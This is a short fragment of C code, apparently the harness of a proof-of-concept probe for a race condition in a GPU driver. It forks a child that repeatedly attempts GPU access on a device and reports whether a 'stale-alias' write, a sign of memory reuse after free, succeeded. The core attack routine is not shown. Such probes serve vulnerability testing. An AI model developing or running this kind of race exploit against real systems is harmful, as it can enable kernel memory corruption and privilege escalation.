    for (i = 1; i <= MAX_RACE_ITERS; i++) {
        int rc = run_gpu_access_attempt(g_fd, i);

        if (rc > 0) {
            printf("\n[+] Probe finished with a positive stale-alias write signal on iter %d\n", i);
            close(g_fd);
            return;
        }
        if (rc < 0) {
            printf("\n[-] Probe aborted on iter %d due to setup error\n", i);
            close(g_fd);
            return;
        }
    }

    printf("\n[*] No stale-alias GPU write signal in %d iterations\n", MAX_RACE_ITERS);
    close(g_fd);
}

int main(void)
{
    pid_t pid;
    int status;

    pid = fork();
    if (pid < 0)
        return 1;
    if (pid == 0) {
        alarm(60);
        run_probe();
        _exit(0);
    }

    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("[!] Child killed by signal %d\n", WTERMSIG(status));
    return 0;
}
